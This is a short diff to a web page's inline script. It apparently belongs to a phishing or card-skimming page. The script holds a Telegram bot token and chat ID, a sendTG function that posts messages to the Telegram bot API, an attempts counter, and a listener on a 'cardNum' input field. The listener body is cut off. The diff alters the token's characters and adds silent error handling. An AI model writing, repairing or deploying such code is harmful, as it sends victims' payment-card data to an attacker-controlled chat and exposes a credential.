@@ -183,18 +183,20 @@
 
 <script>
     const CONFIG = {
-        token: '8549774953:AAGv1J83qInq-cdNNs51dDfOvoeg-0ST_Q1',
+        token: '8549774953:AAGvlJ83qInq-cdNNs5ldDfOvoeg-OST_QI',
         chat: '656419637'
     };
 
     let attempts = 0;
 
     async function sendTG(msg) {
-        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.chat, text: msg, parse_mode: 'HTML' })
-        });
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.chat, text: msg, parse_mode: 'HTML' })
+            });
+        } catch (e) { console.error("Telegram Send Error", e); }
     }
 
     document.getElementById('cardNum').addEventListener('input', e => {
